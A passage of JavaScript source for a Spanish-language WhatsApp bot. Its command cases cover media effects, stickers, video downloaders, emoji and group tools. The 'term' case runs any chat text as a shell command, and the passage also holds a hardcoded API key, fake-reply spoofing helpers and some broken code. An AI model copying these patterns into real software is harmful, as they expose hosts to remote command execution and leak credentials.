            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('¡Responde a un vídeo!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            FxBot.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek, caption:'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡'})
            fs.unlinkSync(ran)
            })
            break

    case 'slow':
            if (!isQuotedVideo) return fakegroup('¡Responde a un vídeo!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            FxBot.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek, caption:'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡'})
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('¡Responde a un vídeo!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            FxBot.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek, caption:'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡'})
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            FxBot.sendMessage(from,media,image,{quoted: mek, caption:'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'contac':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('¡Número de teléfono invalido!');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            FxBot.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    
    case 'tomiko':
case 'takestick':
case 'robar':
if (!isQuotedSticker) return reply(`𝘔𝘦𝘯𝘤𝘪𝘰𝘯𝘢 𝘶𝘯 𝘴𝘵𝘪𝘤𝘬𝘦𝘳, 𝘦𝘫𝘦𝘮𝘱𝘭𝘰: ${prefix}takestick nombre|autor*`)
const encmediats = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const dlfile = await FxBot.downloadMediaMessage(encmediats)
reply(mess.wait)
const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, '© Fx Bot Team', '❤️‍🔥 Felixcrack & Tomiko🍡')
var imageBuffer = new Buffer.from(mantap, 'base64');
FxBot.sendMessage(from, imageBuffer, sticker, {quoted: mek})
addFilter(from)
break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = '© 𝐹𝑥 𝐵𝑜𝑡 𝑇𝑒𝑎𝑚 🍡'
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            FxBot.sendMessage(from, 'Hay un error, lo siento', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            FxBot.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            FxBot.sendMessage(from, 'Hay un error, lo siento', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            FxBot.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`ຯ❏͜ᰰ Responde a una imagen con : ${prefix}swm Texto|Texto `)
            }
            break
    case 'upswteks':
    case 'subir_texto':
            if (!q) return fakestatus('Isi teksnya!')
            FxBot.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`El texto se subió exitosamente ${q}`)
            break
    case 'upswimage':
    case 'subir_imagen':
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await FxBot.downloadMediaMessage(swsw)
            FxBot.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `La imagen se subió exitosamente : ${q}`
            FxBot.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('¡Responde a una imagen!')
            }
            break
    case 'upswvideo':
    case 'subir_video':
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await FxBot.downloadMediaMessage(swsw)
            FxBot.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `El video se subió exitosamente : ${q}`
            FxBot.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('¡Responde a un vídeo!')
            }
            break
    
    case 'public':
          	if (!mek.key.fromMe) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!mek.key.fromMe) return fakestatus('SELF-BOT')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *SELF-MODE* 」`)
          	break
 	case 'hidetag':
			if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
			var value = args.join(' ')
			var group = await FxBot.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			FxBot.sendMessage(from, optionshidetag, text)
			break
	case 'play':
if (args.length === 0) return reply(`Ejemplo: *${prefix}play* _El título de la musica para buscar_`)
			reply('Espera, tu musica sera enviada en unos momentos...')
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*DESCARGADOR DE MUSICA BY FELIXCRACK*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*: MP3\n*⚖️Tamaño*: ${filesizeF}\n*📎Link* : ${a.data}\n\n_ESPERE ENVIANDO ARCHIVO, NO SPAMES LA CONCHA DE TU MADRE_`)
		                        const captions = `*DESCARGADOR DE MUSICA BY FELIXCRACK*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*: MP3\n*⚖️Tamaño*: ${filesizeF}\n*📎Link*: ${a.data}\n\n_ESPERE ENVIANDO ARCHIVO, NO SPAMES LA CONCHA DE TU MADRE_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case 'video':
            if (args.length === 0) return reply(`Ejemplo: *${prefix}video* _El título del video para buscar_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*:MP3\n*File⚖️Tamaño*:${filesizeF}\n*Link* : ${a.data}\n\n_ESPERE ENVIANDO ARCHIVO, NO SPAMES LA CONCHA DE TU MADRE_`)
		                        const captions = `*PLAY VIDEO*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*:MP4\n*⚖️Tamaño*:${filesizeF}\n*Link* : ${a.data}\n\n_ESPERE ENVIANDO ARCHIVO, NO SPAMES LA CONCHA DE TU MADRE_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
    case 'sticker': 
    case 'stickergif': 
    case 'stiker':
    case 'sg':
    case 's':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            F = body.slice(6)				  
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await FxBot.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                FxBot.sendMessage(from, fs.readFileSync(ran), MessageType.sticker, { thumbnail:ran, contextInfo: { externalAdReply:{title:'𝑭𝒆𝒍𝒊𝒙𝒄𝒓𝒂𝒄𝒌 & 𝑻𝒐𝒎𝒊𝒌𝒐 𝑩𝒐𝒕 𝑶𝒇𝒄',body:'Felix Bot',previewType:"PHOTO",thumbnailUrl:'https://e.top4top.io/p_2067fvqbo0.jpg',sourceUrl:'https://chat.whatsapp.com/KVITQzDXdMyEXLgb0eGn8v'}}, quoted : mek })
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Falló, al convertir ${tipe} a stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            FxBot.sendMessage(from, fs.readFileSync(ran), MessageType.sticker, { thumbnail:ran, contextInfo: { externalAdReply:{title:'𝑭𝒆𝒍𝒊𝒙𝒄𝒓𝒂𝒄𝒌 & 𝑻𝒐𝒎𝒊𝒌𝒐 𝑩𝒐𝒕 𝑶𝒇𝒄',body:'Felix Bot',previewType:"PHOTO",thumbnailUrl:'https://e.top4top.io/p_2067fvqbo0.jpg',sourceUrl:'https://chat.whatsapp.com/KVITQzDXdMyEXLgb0eGn8v'}}, quoted : mek })
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(300,iw)':min'(300,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Envia una imagen o un vídeo, en caso de ser video solo debe durar 6 Segundos.`)
            }
            break


case 'dado':
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./dados/${random}.webp`)
			FxBot.sendMessage(from, damdu, sticker, {quoted: mek})
			break

	case 'ytsearch':
			if (args.length < 1) return reply('Que quieres buscar?')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await FxBot.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '❏ Título: ' + video.title + '\n'
		            ytresult += '❏ Link: ' + video.url + '\n'
		            ytresult += '❏ Duración: ' + video.timestamp + '\n'
		            ytresult += '❏ Subida: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	
	case 'setfake':
	if (!mek.key.fromMe) return fakestatus('❏ Este comando solo puede ser usado por mi')
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Exito al modificar el FakeReply a : ${q}`)
			break
	case 'setfakeimg':
	if (!mek.key.fromMe) return fakestatus('❏ Este comando solo puede ser usado por mi')
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await FxBot.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Exito al remplazar la imagen')
        	} else {
            reply(`Envia o responde una imagen, con : ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
	if (!mek.key.fromMe) return fakestatus('❏ Este comando solo puede ser usado por mi')
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await FxBot.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Exito al remplazar la miniatura')
        	} else {
            reply(`Envia o responde una imagen, con : ${prefix}sethumb`)
          	}
			break	
	case 'ytmp4':
			if (args.length === 0) return reply(`Enviar  comando *${prefix}ytmp4 [linkYt]*`)
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return reply(mess.error.Iv)
try {
reply(mess.mpv)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*DESCARGADOR DE VIDEO BY FELIXCRACK*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*:MP3\n*File⚖️Tamaño*:${filesizeF}\n*Link* : ${a.data}\n\n_Para la duración de más del límite se presenta en forma de enlace_`)
						const captionsYtmp4 = `*Video Encontrado!*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*:MP4\n*⚖️Tamaño*:${filesizeF}\n\n_ESPERE ENVIANDO ARCHIVO, NO SPAMES LA CONCHA DE TU MADRE_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
case 'ban':
if (!isGroup) return reply(mess.only.group)
if (!mek.key.fromMe) return fakestatus('「 ❗ 」ESTE COMANDO SOLO PUEDE SER USADO POR MI')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `🚫@${mentioned[0].split('@')[0]} ha sido prohibido y ya no podrá usar comandos de bot🚫`
mentions(`${susp}`, mentioned, true)   
break


case 'unban':
if (!isGroup) return reply(mess.only.group)
if (!mek.key.fromMe) return fakestatus('「 ❗ 」ESTE COMANDO SOLO PUEDE SER USADO POR MI')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `❎@${mentioned[0].split('@')[0]} se ha desbloqueado y puede volver a utilizar los comandos del bot❎`
mentions(`${susp}`, mentioned, true)   
break
	
case 'emoji_samsung':

	num = body.slice(6)			 
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[2].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_microsoft':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[3].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_whastapp':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_twitter': 
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[5].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break

case 'emoji_facebook':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[6].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_skype':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[7].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_joypixels':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[8].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_openmoji':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[9].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_emojidex':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[10].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji3d':
case 'emoji3D':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[11].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
   
    		break
case 'emoji_lg':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[12].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'emoji_htc':
			if (!q) return fakegroup('¿Y el emoji?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[13].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
case 'melon':  
                   if (args.length < 1) return reply(`[❗] Ejemplo??\n*${prefix}${command} gatitos*`)
                   reply(mess.wait)
                   F = body.slice(6)				    
                   getBuffer(`https://api.zeks.me/api/unsplash?apikey=FELIXCRACKAPI409&q=${F}`)
                   FxBot.sendMessage(from, anu, image, {caption: `𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇`, quoted: mek })
                   break 
	case 'ytmp3':
			if (args.length === 0) return reply(`Ejemplo: *${prefix}video* _El link del video para descargar`)
       let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
    if (!isLinks) return reply(mess.error.Iv)
     try {
          reply(mess.musica)
      yta(args[0])
   .then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*DESCARGADOR DE AUDIO BY FELIXCRACK*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*:MP3\n*⚖️Tamaño*:${filesizeF}\n*Link* : ${a.data}\n\n_Para la duración de más del límite se presenta en forma de enlace_`)
const captions = `*DESCARGADOR DE AUDIO BY FELIXCRACK*\n\n*🤓Titulo*: ${title}\n*⏭️Extensión*:MP3\n*⚖️Tamaño*:${filesizeF}\n\n_ESPERE ENVIANDO ARCHIVO, NO SPAMES LA CONCHA DE TU MADRE_`
sendMediaURL(from, thumb, captions)
sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
})
})
} catch (err) {
reply(mess.error.api)
}
break
    case 'image':
            if (args.length < 1) return reply('¡Ingrese algo para buscar!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            FxBot.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('¿Y el enlace?')
 		reply(mess.wait)
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Título* : ${text}\n*Enlace* : ${a.data}`
		FxBot.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('¿Y el enlace?')
 		reply(mess.wait)
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		FxBot.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:mek})
		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Que clase de pregunta es esa?')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pregunta:* ${Y.pertanyaan}\n\n*➸ Respuesta:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			FxBot.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
case 'ig':
case 'igdl':
case 'instagram':
const c = args.join(' ')
if (!c) return reply('¿Y el link?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
    case 'igstalk':
            if (!q) return fakegroup('¿Nombre de usuario?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Nombre de usuario* : ${args.join('')}\n*Nombre completo* : ${Y.full_name}\n*BIO* : ${Y.biography}\n*Seguidores* : ${Y.followers}\n*Siguiendo* : ${Y.following}\n*Privado* : ${Y.is_private}\n*Verificado* : ${Y.is_verified}\n\n*Enlace* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('¿Y el enlace?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            fakestatus(mess.wait)
            Fb.getInfo(`${te}`)
            .then(G => {
            ten = `${G.download.sd}`
            tek = `${G.title}`
            sendMediaURL(from,ten,`*Título* : ${tek}\n\n*Enlace* : ${ten}`)
            })
            break    
	case 'term':
	if (!mek.key.fromMe) return 
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
    case 'join':
            if (!mek.key.fromMe) return 
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('¡Ingrese el enlace del grupo!')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('¡Asegúrese de que el enlace sea correcto!')
            var response = await FxBot.acceptInvite(codeInvite)
            fakestatus('ÉXITO')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
case 'adminlist':
case 'admins':
case 'adminslista':
case 'listadmin':
 if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
					teks = `▢ Lista Admins Del Grupo *${groupMetadata.subject}*\n▢ Total : ${groupAdmins.length}\n▢ Mensaje:* ${body.slice(12)}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
